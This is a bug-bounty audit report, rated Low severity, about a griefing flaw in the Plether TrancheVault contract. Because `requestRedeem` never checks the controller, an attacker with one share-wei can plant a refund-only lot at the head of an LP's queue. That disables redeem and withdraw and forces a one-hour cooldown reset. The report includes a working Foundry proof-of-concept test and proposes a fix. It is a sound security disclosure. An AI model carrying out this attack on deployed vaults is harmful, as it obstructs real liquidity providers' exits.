# \#97709 [SC-Low] Anyone can plant an unclaimable redeem lot at the head of an LP's queue; clearing it restarts the LP's cooldown

**Submitted on Nov 2nd 2026 at 19:09:32 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97709
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description


## Summary

`TrancheVault.requestRedeem(shares, controller, owner)` checks that the caller may spend `owner`'s shares but puts no condition on `controller`. A fresh address holding a single share-wei can therefore file a redeem request on behalf of any LP. Filed one second before the request cutoff into an epoch that is still empty, the lot settles refund-only (it quotes to 0 USDG, so HousePool cannot fund it) and becomes the head of the LP's controller queue. From then on her canonical `redeem` and `withdraw` revert and `maxRedeem`/`maxWithdraw` read 0, even while her own later epoch is fully funded. She can still collect by explicit request id, but that leaves the lot in place. The only way to remove it is `claimRedeemRefund`, which must deliver the share-wei to her and restarts her one-hour cooldown: no new redeem request and no share transfer for exactly 3,600 seconds. The attacker can repeat this once per hour for the price of a share-wei.

Severity: **Low**. No funds are lost and no funds are frozen — the explicit-id claim always works. What breaks is the exit path the protocol itself tells LPs to use, and the only repair is a cooldown the vault's design says a third party should not be able to impose.

## Description

The vault documents the goal directly. Deposit claims, redemption cancellations and refunds require `receiver == controller` "so share delivery cannot impose another account's cooldown or depend on an unsolicited receiver balance" (`IAsyncTrancheVault.sol:12-14`, repeated in `SECURITY.md:1402-1404`). That rule closed the claim-side route. The request side was left open: `requestRedeem` (`TrancheVault.sol:606-632`) authenticates `owner` (625-627) and only zero-checks `controller` (611), while its sibling `requestRedeemFromClaimableDeposit` does call `_requireControllerAuth(controller)` (658). So a request can be parked on any controller as long as the caller owns the shares being escrowed.

The shares needed are one wei. `_requireMinimumRedeemSize` (1611-1617) only rejects a request when it is worth less than the minimum *and* smaller than the owner's whole available balance; an address holding exactly 1 share-wei redeems its whole balance and passes. Transfers are free once the sender's own cooldown has elapsed (`_update`, 325-331), and the recipient inherits that already-expired timestamp, so one 1 USDG deposit seeds as many such addresses as the attacker wants.

Placement is under the attacker's control. `_requestEpochWindow` (545-556) sends a request filed before `nextRequestCutoffTime` (five minutes before the hour, `LP_REQUEST_CUTOFF_DURATION`, line 39) into epoch e+1 and anything filed from the cutoff on into e+2. The attacker reads `redeemEpochs(e+1).shares`, files at `cutoff − 1` if it is zero, and knows that anyone requesting afterwards lands behind the lot. The real precondition is that the target epoch is empty at the cutoff; in a tranche without redemption traffic in every hour of the day that is most hours.

At settlement the lot is alone in its epoch and `netAssetsForShares(1, …)` is 0, so HousePool takes the refund branch (`HousePool.sol:957-986`, `refundRedeemEpochRemainder`); `fundRedeemEpoch` would have rejected `assets == 0` anyway (~1488). The lot now sits at `controllerRedeemHead[victim]` with `fundedShares == 0`.

The canonical claim path reads that head. `maxRedeem`/`maxWithdraw` (1301-1313) return 0, and `redeem`/`withdraw` (998-1012 → `_claimRedeem`/`_claimWithdraw`, 1148-1199) revert with `ERC4626ExceededMaxRedeem`/`ExceededMaxWithdraw`, regardless of what is funded behind the lot. `CANONICAL_ENTRYPOINTS.md:191-192` names exactly these two functions as the way LP exits are claimed; the explicit-id functions are described as the integration variant (`IAsyncTrancheVault.sol:8-10`). The explicit path (`claimRedeem(requestId, …)`, 1014-1021) does pay the victim and does not touch her timestamp, but it does not remove the lot, so the canonical path stays dead.

Removing the lot means `claimRedeemRefund` (916-948): `cancelRedeemRequest` is only available before the lot's epoch begins (894) and the victim normally notices after settlement. The refund has to go to the controller (`_requireShareReceiver`, 931), the shares are nonzero, and the function writes `lastDepositTime[receiver] = block.timestamp` (943). `requestRedeem` then reverts `DepositCooldown` (617), `maxRequestRedeem` returns 0 (1329-1334) and transfers revert `TransferDuringCooldown` (325-327) until exactly one hour later. The reset itself is documented behaviour for refunds (`SECURITY.md:1399`); what is not intended is that somebody else can create the refund.

This is not the LOW-39/40 dust-receiver issue (claim side, fixed by `receiver == controller`) and not LOW-67 (dust burned in a shared epoch). In a shared epoch the dust lot is owed one share and a plain `redeem` clears it without a reset; the attacker avoids that case by choosing an empty epoch at the cutoff.

## Impact

For any LP, an attacker holding one share-wei per hour can disable the exit path the protocol documents as canonical, make the ERC-7575 claim-capacity views report nothing while a funded redemption is waiting, and leave the LP a choice between living with that permanently or clearing the lot and taking a one-hour lock on new redeem requests and share transfers each time. The attacker's cost is one share-wei per plant, which the victim ends up holding, plus gas; the one-time 1 USDG deposit stays theirs as shares.

This is Low on the rubric: the contract fails to deliver the behaviour it promises, but the LP's money is neither lost nor frozen, since `claimRedeem(requestId, …)` works throughout and the cooldown is one hour per round.

Fix: apply `_requireControllerAuth(controller)` in `requestRedeem` (and `requestDeposit`, which has the same shape), matching `requestRedeemFromClaimableDeposit`. ERC-7540 requires owner authorization; it does not forbid also requiring the controller's. Alternatively, do not restart the cooldown when the refunded lot was not filed by the controller or its operator.


## Proof of Concept

## Proof of Concept

`packages/perps/test/perps/poc/PoC_RedeemLotInjection.t.sol` (attached). Run with `forge test --root packages/perps --match-path test/perps/poc/PoC_RedeemLotInjection.t.sol -vv`. It passes on the repository's own `BasePerpTest`/`HousePoolAsyncTestBase` stack.

What it shows, in order: the attacker verifies on-chain that the target epoch is empty and files at `cutoff − 1`; Alice files at the cutoff and lands in the next epoch; one settlement leaves the lot refund-only and Alice's epoch funded; `maxRedeem`/`maxWithdraw` are 0 and `redeem`/`withdraw` revert; the explicit-id claim pays her without a cooldown change but the lot is still the head; `claimRedeemRefund` hands her the share-wei and restarts her cooldown; `requestRedeem` reverts `DepositCooldown` at +0 and +3,599 s and succeeds at +3,600 s; transfers revert in between; the attacker spent no settlement token.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ERC4626} from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract PoC_RedeemLotInjection is HousePoolAsyncTestBase {

    address internal constant ALICE = address(0xA11CE); // victim LP
    address internal constant MALLORY = address(0x5A1); // griefer: one 1 USDG deposit, kept as shares
    address internal constant DUST = address(0xD057); // fresh address holding exactly 1 share-wei
    address internal constant BOB = address(0xB0B);
    uint256 internal constant ALICE_DEPOSIT = 100_000e6;

    function setUp() public override {
        super.setUp();
        _fundJunior(ALICE, ALICE_DEPOSIT);
        _fundJunior(MALLORY, pool.minTrancheDepositAssets()); // 1 USDG
        _finishAsyncCooldown(juniorVault, MALLORY);
        vm.prank(MALLORY);
        juniorVault.transfer(DUST, 1); // DUST inherits Mallory's already-expired timestamp
        _finishAsyncCooldown(juniorVault, ALICE);
    }

    function test_PlantedLotBlocksCanonicalClaimsAndClearingItRestartsCooldown() public {
        uint256 half = juniorVault.balanceOf(ALICE) / 2;

        // 1. Plant: last second before the cutoff, into an epoch the attacker has verified is empty.
        (uint256 targetEpoch, uint256 cutoff) = juniorVault.getRequestEpochWindow();
        vm.warp(cutoff - 1);
        (uint256 epochSharesBefore,,,,,,,,,) = juniorVault.redeemEpochs(targetEpoch);
        assertEq(epochSharesBefore, 0, "precondition the attacker verifies on-chain: target epoch is empty");
        vm.prank(DUST);
        uint256 lot = juniorVault.requestRedeem(1, ALICE, DUST); // shares == maxShares: dust exemption applies
        assertEq(lot, targetEpoch);
        assertEq(juniorVault.controllerRedeemHead(ALICE), lot, "lot is the head of Alice's controller queue");

        // 2. Alice files at the cutoff and lands in the next epoch, behind the lot.
        vm.warp(cutoff);
        uint256 aliceRequest = _requestAsyncRedeem(juniorVault, ALICE, half);
        assertEq(aliceRequest, lot + 1);

        // 3. Settlement: the 1-wei epoch quotes to 0 USDG, so it can only become refund-only.
        _settleAsyncRequest(aliceRequest, true);
        assertEq(juniorVault.refundableRedeemRequest(lot, ALICE), 1, "planted lot is refund-only");
        assertEq(juniorVault.claimableRedeemRequest(aliceRequest, ALICE), half, "Alice's own epoch is funded");
        uint256 aliceAssets = juniorVault.claimableRedeemAssets(aliceRequest, ALICE);
        assertGt(aliceAssets, 0);

        // 4. Canonical claims (CANONICAL_ENTRYPOINTS.md:191-192) are dead while the lot is the head.
        assertEq(juniorVault.maxRedeem(ALICE), 0);
        assertEq(juniorVault.maxWithdraw(ALICE), 0);
        vm.startPrank(ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxRedeem.selector, ALICE, half, 0));
        juniorVault.redeem(half, ALICE, ALICE);
        vm.expectRevert(abi.encodeWithSelector(ERC4626.ERC4626ExceededMaxWithdraw.selector, ALICE, aliceAssets, 0));
        juniorVault.withdraw(aliceAssets, ALICE, ALICE);

        // 5. Explicit-id claim pays her and leaves the cooldown alone, but the lot stays at the head.
        uint256 snapshot = vm.snapshotState();
        uint256 cooldownBefore = juniorVault.lastDepositTime(ALICE);
        assertEq(juniorVault.claimRedeem(aliceRequest, half, ALICE, ALICE), aliceAssets);
        assertEq(juniorVault.lastDepositTime(ALICE), cooldownBefore);
        assertEq(juniorVault.controllerRedeemHead(ALICE), lot);
        assertEq(juniorVault.maxRedeem(ALICE), 0);
        vm.revertToState(snapshot);

        // 6. Clearing the lot: refund must go to the controller, so Alice gets the share-wei and a fresh cooldown.
        uint256 clearedAt = vm.getBlockTimestamp();
        assertEq(juniorVault.claimRedeemRefund(lot, ALICE, ALICE), 1);
        assertEq(juniorVault.lastDepositTime(ALICE), clearedAt, "cooldown restarted");
        assertEq(juniorVault.maxRedeem(ALICE), half, "canonical path works again");
        assertEq(juniorVault.redeem(half, ALICE, ALICE), aliceAssets);

        uint256 rest = juniorVault.balanceOf(ALICE) - 1;
        assertEq(juniorVault.maxRequestRedeem(ALICE), 0);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(rest, ALICE, ALICE);
        vm.expectRevert(TrancheVault.TrancheVault__TransferDuringCooldown.selector);
        juniorVault.transfer(BOB, 1);
        vm.warp(clearedAt + 3599);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        juniorVault.requestRedeem(rest, ALICE, ALICE);
        vm.warp(clearedAt + 3600);
        juniorVault.requestRedeem(rest, ALICE, ALICE); // succeeds exactly one hour after she cleared the lot
        vm.stopPrank();

        assertEq(juniorVault.balanceOf(DUST), 0);
        assertEq(settlementToken.balanceOf(MALLORY), 0);
    }
}
```
